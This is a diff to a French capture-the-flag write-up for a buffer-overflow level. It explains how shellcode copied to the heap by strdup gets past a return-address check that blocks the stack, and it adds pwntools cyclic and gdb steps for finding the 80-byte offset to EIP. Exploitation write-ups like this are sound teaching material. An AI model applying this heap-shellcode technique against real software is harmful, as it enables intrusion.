@@ -7,12 +7,11 @@ On retrouve un `gets()` (donc un buffer overflow possible), mais avec une protec
 - le programme vérifie l'adresse de retour ;
 - si cette adresse appartient à la stack (plage `0xb...`), il quitte avec `_exit(1)`.
 
-Conclusion : on ne peut pas simplement faire un retour vers la stack.
-
+Conclusion : on ne peut pas simplement faire un retour vers la stack mais ça change rien pour nous il y a un strdup qui fait passer par la heap.
 #### Etape 02 :
 
-La fonction fait ensuite un `strdup(local_50)`.
-`strdup()` alloue la chaîne sur le tas (heap), donc l'idée est :
+La fonction un `strdup(local_50)`.
+`strdup()` alloue la chaîne sur la heap, donc l'idée est :
 - injecter un shellcode dans l'entrée ;
 - laisser `strdup()` copier ce shellcode dans la heap ;
 - écraser l'adresse de retour avec une adresse située dans la heap.
@@ -33,7 +32,23 @@ ltrace ./level2
 ```
 
 On obtient une valeur du type `strdup(...) = 0x0804a008`.
-On calcule ensuite l'offset jusqu'à l'EIP  buffer fait 76 octets, puis tu as 4 octets de sauvegarde EBP avant EIP, donc (76 + 4 = 80). :
+On calcule ensuite l'offset jusqu'à l'EIP.
+```
+python -c "from pwn import *; print(cyclic(200).decode())"
+```
+```
+(gdb) run
+aaaabaaacaaadaa...
+```
+```
+Program received signal SIGSEGV, Segmentation fault.
+0x61616175 in ?? ()
+```
+```
+python -c "from pwn import *; print(cyclic_find(0x61616175))"
+```
+
+
 - offset = `80` ;
 - padding = `80 - 21 = 59`. (la taille du shellcode)
 
